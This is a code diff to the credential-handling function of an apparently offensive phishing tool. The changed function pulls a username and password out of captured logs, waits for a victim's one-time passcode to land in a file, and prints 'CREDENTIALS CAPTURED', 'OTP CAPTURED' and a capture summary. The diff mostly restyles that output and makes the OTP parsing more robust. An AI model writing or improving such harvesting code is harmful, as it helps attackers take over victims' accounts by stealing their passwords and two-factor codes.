@@ -1040,14 +1040,19 @@ def work():
 	
 def work_otp():
 	otp_code = ""
-	
-	try:
-		print("")
-		while not (os.path.exists("log.txt")):
-			log = work()
-			print("")
-			username, password = extract_data(log)
+	username = None
+	password = None
 
+	try:
+		log = work()
+		print("")
+		print("\033[1;93m" + "=" * 50 + "\033[0;0m")
+		printf("CREDENTIALS CAPTURED", "INFO")
+		print("\033[1;93m" + "-" * 50 + "\033[0;0m")
+		username, password = extract_data(log)
+		print("\033[1;93m" + "=" * 50 + "\033[0;0m")
+
+		print("")
 		while not (os.path.exists("otp.txt")):
 			print("\r\033[1;92mWaiting for the otp   \033[0;0m",end="",flush=True)
 			time.sleep(1)
@@ -1057,16 +1062,34 @@ def work_otp():
 			time.sleep(1)
 			print("\r\033[1;92mWaiting for the otp...\033[0;0m",end="",flush=True)
 			time.sleep(1)
-			if (os.path.exists("otp.txt") == True):
-				print("\r                                             ",end="\r")
-				try:
-					otp_file = open("otp.txt","r")
-					otp = otp_file.read()
-					otp_file.close()
-					print(otp)
-					otp_code = otp.split(": ")[1]
-				except:
-					pass
+
+		print("\r\033[1;92mOTP received.                 \033[0;0m")
+		try:
+			otp_file = open("otp.txt","r")
+			otp = otp_file.read()
+			otp_file.close()
+			otp_code = otp.strip().split(": ")[-1] if ": " in otp else otp.strip()
+		except:
+			pass
+
+		print("")
+		print("\033[1;93m" + "=" * 50 + "\033[0;0m")
+		printf("OTP CAPTURED", "INFO")
+		print("\033[1;93m" + "-" * 50 + "\033[0;0m")
+		print("\033[1;92mOTP:\033[0;0m {}".format(otp_code))
+		print("\033[1;93m" + "=" * 50 + "\033[0;0m")
+
+		print("")
+		print("\033[1;96m" + "=" * 50 + "\033[0;0m")
+		printf("CAPTURE SUMMARY", "INFO")
+		print("\033[1;96m" + "-" * 50 + "\033[0;0m")
+		if username:
+			print("  {}".format(username))
+		if password:
+			print("  {}".format(password))
+		print("  \033[1;92mOTP:\033[0;0m {}".format(otp_code))
+		print("\033[1;96m" + "=" * 50 + "\033[0;0m")
+
 	except:
 		stop()
 		sys.exit()
